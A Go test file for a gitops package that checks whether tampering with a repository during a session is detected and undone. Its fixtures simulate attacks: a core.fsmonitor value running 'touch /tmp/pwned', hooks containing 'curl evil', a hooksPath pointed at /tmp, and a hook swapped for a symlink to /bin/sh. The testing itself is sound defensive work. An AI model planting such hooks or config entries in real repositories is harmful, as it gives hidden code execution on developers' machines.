package gitops

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/google/go-cmp/cmp"
)

// tamperRepo is a repository with what a session could tamper with: two
// commits, a second branch, a remote branch with a symbolic HEAD, a hook and
// the worktree of a node.
type tamperRepo struct {
	g            *Git
	repo, common string
	old          string // the first commit; main is at the second
	node         string // the node worktree
}

func newTamperRepo(t *testing.T) tamperRepo {
	t.Helper()
	g := newGit()
	repo := newRepo(t, g)
	r := tamperRepo{g: g, repo: repo, common: filepath.Join(repo, ".git"), old: git(t, g, repo, "rev-parse", "HEAD")}
	commit(t, g, repo, map[string]string{"b.txt": "b\n"})
	git(t, g, repo, "branch", "keep")
	git(t, g, repo, "update-ref", "refs/remotes/origin/main", "HEAD")
	git(t, g, repo, "symbolic-ref", "refs/remotes/origin/HEAD", "refs/remotes/origin/main")
	if err := os.RemoveAll(filepath.Join(r.common, "hooks")); err != nil { // the samples vary with the git build
		t.Fatal(err)
	}
	write(t, filepath.Join(r.common, "hooks", "post-merge"), "#!/bin/sh\nexit 0\n", 0o755)
	write(t, filepath.Join(r.common, "hooks", "pre-push"), "#!/bin/sh\nexit 0\n", 0o644) // not executable: inactive
	write(t, filepath.Join(r.common, "hooks", "update"), "#!/bin/sh\nexit 0\n", 0o755)
	r.node = filepath.Join(t.TempDir(), "node")
	mustAdd(t, g, WorktreeSpec{Repo: repo, Path: r.node, Branch: "node/1", Base: "main"})
	return r
}

func TestCheckRestores(t *testing.T) {
	tests := []struct {
		name   string
		tamper func(t *testing.T, r tamperRepo)
		want   []string // the changes reported; nil when none
	}{
		{
			name:   "nothing changed",
			tamper: func(*testing.T, tamperRepo) {},
		},
		{
			name:   "node branch committed: allowed",
			tamper: func(t *testing.T, r tamperRepo) { commit(t, r.g, r.node, map[string]string{"n.txt": "n\n"}) },
		},
		{
			name:   "branch moved",
			tamper: func(t *testing.T, r tamperRepo) { git(t, r.g, r.node, "update-ref", "refs/heads/main", r.old) },
			want:   []string{"refs/heads/main moved"},
		},
		{
			name:   "branch deleted",
			tamper: func(t *testing.T, r tamperRepo) { git(t, r.g, r.node, "branch", "-D", "keep") },
			want:   []string{"refs/heads/keep deleted"},
		},
		{
			name: "branch and tag created",
			tamper: func(t *testing.T, r tamperRepo) {
				git(t, r.g, r.node, "branch", "evil")
				git(t, r.g, r.node, "tag", "v9")
			},
			want: []string{"refs/heads/evil created", "refs/tags/v9 created"},
		},
		{
			name: "packed and loose refs rewritten",
			tamper: func(t *testing.T, r tamperRepo) {
				git(t, r.g, r.repo, "pack-refs", "--all")
				git(t, r.g, r.node, "update-ref", "refs/heads/keep", r.old)
			},
			want: []string{"refs/heads/keep moved"},
		},
		{
			name: "symbolic ref retargeted",
			tamper: func(t *testing.T, r tamperRepo) {
				git(t, r.g, r.node, "symbolic-ref", "refs/remotes/origin/HEAD", "refs/heads/keep")
			},
			want: []string{"refs/remotes/origin/HEAD moved"},
		},
		{
			name: "symbolic ref made direct",
			tamper: func(t *testing.T, r tamperRepo) {
				git(t, r.g, r.node, "update-ref", "--no-deref", "refs/remotes/origin/HEAD", r.old)
			},
			want: []string{"refs/remotes/origin/HEAD moved"},
		},
		{
			name: "config changed",
			tamper: func(t *testing.T, r tamperRepo) {
				git(t, r.g, r.node, "config", "core.fsmonitor", "touch /tmp/pwned")
			},
			want: []string{".git/config changed"},
		},
		{
			name: "config files added",
			tamper: func(t *testing.T, r tamperRepo) {
				write(t, filepath.Join(r.common, "config.worktree"), "[core]\n\thooksPath = /tmp\n", 0o644)
				write(t, filepath.Join(r.common, "worktrees", "node", "config.worktree"), "[core]\n\thooksPath = /tmp\n", 0o644)
			},
			want: []string{".git/config.worktree added", ".git/worktrees/node/config.worktree added"},
		},
		{
			name: "config removed",
			tamper: func(t *testing.T, r tamperRepo) {
				if err := os.Remove(filepath.Join(r.common, "config")); err != nil {
					t.Fatal(err)
				}
			},
			want: []string{".git/config removed"},
		},
		{
			name: "hook added",
			tamper: func(t *testing.T, r tamperRepo) {
				write(t, filepath.Join(r.common, "hooks", "pre-commit"), "#!/bin/sh\ncurl evil\n", 0o755)
			},
			want: []string{"hook pre-commit added"},
		},
		{
			name: "hook changed, made executable and removed",
			tamper: func(t *testing.T, r tamperRepo) {
				write(t, filepath.Join(r.common, "hooks", "post-merge"), "#!/bin/sh\ncurl evil\n", 0o755)
				if err := os.Chmod(filepath.Join(r.common, "hooks", "pre-push"), 0o755); err != nil {
					t.Fatal(err)
				}
				if err := os.Remove(filepath.Join(r.common, "hooks", "update")); err != nil {
					t.Fatal(err)
				}
			},
			want: []string{"hook post-merge changed", "hook pre-push changed", "hook update removed"},
		},
		{
			name: "hook replaced by a symlink and hidden in a directory",
			tamper: func(t *testing.T, r tamperRepo) {
				hook := filepath.Join(r.common, "hooks", "post-merge")
				if err := os.Remove(hook); err != nil {
					t.Fatal(err)
				}
				if err := os.Symlink("/bin/sh", hook); err != nil {
					t.Fatal(err)
				}
				write(t, filepath.Join(r.common, "hooks", "sub", "x"), "x\n", 0o755)
			},
			want: []string{"hook post-merge changed", "hook sub/x added"},
		},
		{
			name: "hooks directory replaced by a symlink",
			tamper: func(t *testing.T, r tamperRepo) {
				hooks := filepath.Join(r.common, "hooks")
				elsewhere := filepath.Join(t.TempDir(), "hooks")
				if err := os.Rename(hooks, elsewhere); err != nil {
					t.Fatal(err)
				}
				write(t, filepath.Join(elsewhere, "pre-commit"), "#!/bin/sh\ncurl evil\n", 0o755)
				if err := os.Symlink(elsewhere, hooks); err != nil {
					t.Fatal(err)
				}
			},
			want: []string{"hook post-merge removed", "hook pre-push removed", "hook update removed", "hooks directory added"},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx := context.Background()
			r := newTamperRepo(t)
			before, err := r.g.Snapshot(ctx, r.repo)
			if err != nil {
				t.Fatal(err)
			}
			node := git(t, r.g, r.repo, "rev-parse", "refs/heads/node/1")
			tt.tamper(t, r)
			nodeAfter := git(t, r.g, r.repo, "rev-parse", "refs/heads/node/1")

			err = r.g.Check(ctx, r.node, before, "refs/heads/node/1")
			if tt.want == nil {
				if err != nil {
					t.Fatalf("Check: %v", err)
				}
			} else if !errors.Is(err, ErrTampered) || err.Error() != ErrTampered.Error()+": "+strings.Join(tt.want, "; ") {
				t.Fatalf("Check = %v, want ErrTampered with %q", err, tt.want)
			}

			after, err := r.g.Snapshot(ctx, r.repo)
			if err != nil {
				t.Fatal(err)
			}
			after.Refs["refs/heads/node/1"] = node // the allowed ref is left as the session made it
			if diff := cmp.Diff(before, after); diff != "" {
				t.Errorf("not restored (-before +after):\n%s", diff)
			}
			if got := git(t, r.g, r.repo, "rev-parse", "refs/heads/node/1"); got != nodeAfter {
				t.Errorf("allowed ref restored to %s, want %s", got, nodeAfter)
			}
		})
	}
}

func TestCheckReportsRestoreFailure(t *testing.T) {
	ctx := context.Background()
	r := newTamperRepo(t)
	before, err := r.g.Snapshot(ctx, r.repo)
	if err != nil {
		t.Fatal(err)
	}
	before.Refs["refs/heads/ghost"] = strings.Repeat("d", 40) // an object the repository does not have

	err = r.g.Check(ctx, r.repo, before)
	if !errors.Is(err, ErrTampered) || !strings.Contains(err.Error(), "refs/heads/ghost deleted") || !strings.Contains(err.Error(), "restore refs/heads/ghost") {
		t.Errorf("Check = %v, want the change and the failed restore", err)
	}
}
